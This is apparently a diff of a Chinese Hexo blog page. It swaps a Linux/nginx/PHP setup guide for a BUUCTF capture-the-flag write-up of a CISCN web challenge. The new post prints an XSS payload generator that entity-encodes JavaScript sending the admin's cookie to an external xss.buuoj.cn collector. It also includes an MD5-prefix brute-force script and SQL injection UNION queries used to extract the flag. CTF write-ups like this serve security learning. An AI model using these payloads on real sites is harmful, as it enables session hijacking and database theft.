@@ -5,16 +5,15 @@
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
     <meta name="keywords" content="hao">
-    <meta name="description" content="（一）linux:
-1.环境准备：
-我的linux选择Ubunto18.04.3
-虚拟机选择VMware Workstation15.5
-两者都去官网下
-虚拟机的话去网上随便找个注册码就可以了
-2.安装Ubunto18.04.3
+    <meta name="description" content="BUUCTF
+CISCN 华东北赛区 WEB2
+首先注册,注册完成之后发现以下功能
 
+在投稿功能发现()被替换成（和）,又看到发表文章之后可以反馈给管理员
+猜测是XSS拿管理员cooike
 
-选择自">
+绕过方法可以根据 HTML Markup 
+ H">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -448,7 +447,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-10-16
+                    2019-12-11
                 </div>
                 
 
@@ -465,57 +464,33 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>（一）linux:</p>
-<p>1.环境准备：</p>
-<p>我的linux选择Ubunto18.04.3</p>
-<p>虚拟机选择VMware Workstation15.5</p>
-<p>两者都去官网下</p>
-<p>虚拟机的话去网上随便找个注册码就可以了</p>
-<p>2.安装Ubunto18.04.3</p>
-<img src="//meetl.github.io/2019/10/16/安装linux/Users\Administrator\AppData\Roaming\Typora\typora-user-images\1570710056406.png" alt="1570710056406" style="zoom:55%;">
+                <p>BUUCTF</p>
+<p>CISCN 华东北赛区 WEB2</p>
+<p>首先注册,注册完成之后发现以下功能</p>
+<p><img src="https://s2.ax1x.com/2019/12/11/QrFX7t.png" alt="avatar"></p>
+<p>在投稿功能发现()被替换成（和）,又看到发表文章之后可以反馈给管理员</p>
+<p>猜测是XSS拿管理员cooike</p>
+<p><img src="https://s2.ax1x.com/2019/12/11/Qrk4Ds.png" alt="avatar"></p>
+<p>绕过方法可以根据 HTML Markup </p>
+<p> HTML Markup: <a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html" target="_blank" rel="noopener">https://www.w3.org/MarkUp/html-spec/html-spec_13.html</a> </p>
+<p>用了赵师傅的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str_= <span class="string">"(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=oqtBDY&amp;keepsession=0&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return''&#125;&#125;)());&#125;)();"</span></span><br><span class="line"></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> str_:</span><br><span class="line">    output += <span class="string">"&amp;#"</span> + str(ord(c))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34"</span> + output + <span class="string">"&amp;#34&amp;#41&lt;/script&gt;"</span>)</span><br></pre></td></tr></table></figure>
 
-<p>选择自定义，下一步</p>
-<p><img src="//meetl.github.io/2019/10/16/安装linux/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1570710238682.png" alt="1570710238682"></p>
-<p>这里选择刚才下好的镜像</p>
-<p><img src="//meetl.github.io/2019/10/16/安装linux/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1570710348604.png" alt="1570710348604"></p>
-<p>选一个位置安装</p>
-<p><img src="//meetl.github.io/2019/10/16/安装linux/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1570710376001.png" alt="1570710376001"></p>
-<img src="//meetl.github.io/2019/10/16/安装linux/Users\Administrator\AppData\Roaming\Typora\typora-user-images\1570710388561.png" alt="1570710388561" style="zoom: 67%;">
+<p>PS:用的时候只需要把id换成平台生成的id</p>
+<p>发表成功之后需要反馈给管理员</p>
+<p><img src="https://s2.ax1x.com/2019/12/11/QrkTU0.png" alt="avatar"></p>
+<p>有一个MD5截断比较</p>
+<p>上了一波祖传代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> tp</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">knownMd5 = <span class="string">'d6abcd'</span>      <span class="comment">#已知的md5明文</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(text)</span>:</span> </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(text).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findCode</span><span class="params">(code)</span>:</span>   </span><br><span class="line">    key = code.split(<span class="string">':'</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])  </span><br><span class="line">    end = int(key[<span class="number">1</span>]) </span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> range(start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(code)[<span class="number">0</span>:<span class="number">6</span>] == knownMd5:            </span><br><span class="line">            <span class="keyword">print</span> (code)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">list=[] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):    <span class="comment">#这里的range(number)指爆破出多少结果停止</span></span><br><span class="line">    list.append(str(<span class="number">10000000</span>*i) + <span class="string">':'</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = tp()    <span class="comment">#使用多线程加快爆破速度</span></span><br><span class="line">pool.map(findCode, list) </span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
 
-<p>接下来一直下一步到</p>
-<p><img src="//meetl.github.io/2019/10/16/安装linux/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1570710450328.png" alt="1570710450328"></p>
-<p>而后开启虚拟机</p>
-<img src="//meetl.github.io/2019/10/16/安装linux/Users\Administrator\AppData\Roaming\Typora\typora-user-images\1570710552034.png" alt="1570710552034" style="zoom:50%;">
+<p>成功反馈之后拿到管理员cooike</p>
+<p><img src="https://s2.ax1x.com/2019/12/11/Qrk75V.png" alt="avatar"></p>
+<p>在admin.php发现sql注入</p>
+<p><img src="https://s2.ax1x.com/2019/12/11/QrkoEq.png" alt="avatar"></p>
+<p>手注拿flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line">-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;</span><br><span class="line"></span><br><span class="line">-1 union select 1,2,flagg from flag</span><br></pre></td></tr></table></figure>
 
-<p>等待下载完成就好</p>
-<p><img src="//meetl.github.io/2019/10/16/安装linux/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1570710742836.png" alt="1570710742836"></p>
-<p>成品下图（做了一点修改，改了个主题，以及安装了中文）</p>
-<p>2.nginx</p>
-<p><img src="//meetl.github.io/2019/10/16/安装linux/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1570710951835.png" alt="1570710951835"></p>
-<p>使用 sudo apt-get install nginx安装（注意要输密码而且是看不见的）</p>
-<p><img src="//meetl.github.io/2019/10/16/安装linux/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1570711136687.png" alt="1570711136687"></p>
-<p>设置一下</p>
-<p>检查服务器：</p>
-<p><img src="//meetl.github.io/2019/10/16/安装linux/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1570711212756.png" alt="1570711212756"></p>
-<p>配置成功：</p>
-<img src="//meetl.github.io/2019/10/16/安装linux/Users\Administrator\AppData\Roaming\Typora\typora-user-images\1570711487558.png" alt="1570711487558" style="zoom:50%;">
-
-<p>3.php-fpm:</p>
-<p>  add-apt-repository ppa:ondrej/ngin</p>
-<p>  add-apt-repository ppa:ondrej/php  </p>
-<p>  都要按ENTER继续</p>
-<p>  使用 apt-get install -y php7.2</p>
-<p>  开始安装各种模块：</p>
-<p>  apt-get install -y php7.2-bcmath php7.2-bz2 php7.2-dba php7.2-enchant php7.2-fpm php7.2-    imap php7.2-interbase php7.2-intl php7.2-mbstring php7.2-phpdbg php7.2-soap php7.2-sybase php7.2-xsl php7.2-zip php7.2-xmlrpc php7.2-xml php7.2-tidy php7.2-sqlite3 php7.2-snmp php7.2-recode php7.2-readline php7.2-pspell php7.2-pgsql php7.2-opcache php7.2-odbc php7.2-mysql</p>
-<p>  apt-get install -y php7.2-ldap php7.2-json php7.2-gmp php7.2-gd php7.2-dev php7.2-curl php7.2-common php7.2-cli php7.2-cgi</p>
-<p>pecl install swoole</p>
-<p>echo “extension=swoole.so” &gt;&gt; /etc/php/7.2/cli/php.ini</p>
-<p>安装完成之后可以启动</p>
-<p><img src="//meetl.github.io/2019/10/16/安装linux/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1570722778518.png" alt="1570722778518"></p>
-<p>总结一下，因为网络问题还有源的问题，有些东西下得超级慢，还有些地方会报错，但都根据网上的资料找到并解决了。</p>
-<p>4.安装mysql</p>
-<p>使用命令安装:</p>
-<p>apt-get install mysql-server mysql-client<br>service mysql start</p>
+<p><img src="https://s2.ax1x.com/2019/12/11/Qrkhuj.png" alt="avatar"></p>
 
             </div>
             <hr/>
@@ -541,7 +516,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://meetl.github.io/2019/10/16/安装linux/">https://meetl.github.io/2019/10/16/安装linux/</a>
+                    <a href="https://meetl.github.io/2019/12/11/BUUCTF刷题/">https://meetl.github.io/2019/12/11/BUUCTF刷题/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -742,9 +717,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2019/12/11/BUUCTF刷题/">
                     <div class="card-image">
@@ -770,9 +746,9 @@ CISCN 华东北赛区 WEB2
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-12-11
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-11
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -781,6 +757,7 @@ CISCN 华东北赛区 WEB2
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -791,7 +768,7 @@ CISCN 华东北赛区 WEB2
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/10/08/测试测试/">
+                <a href="/2019/10/16/安装linux/">
                     <div class="card-image">
                         
                         
@@ -803,15 +780,21 @@ CISCN 华东北赛区 WEB2
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-title: 测试测试date: 2019-10-08 15:11:39tags:-sd第一个文章
-测试测试–
+                            （一）linux:
+1.环境准备：
+我的linux选择Ubunto18.04.3
+虚拟机选择VMware Workstation15.5
+两者都去官网下
+虚拟机的话去网上随便找个注册码就可以了
+2.安装Ubunto18.04.3
 
+
+选择自
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-10-08
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-10-16
                             </span>
                         <span class="publish-author">
                             
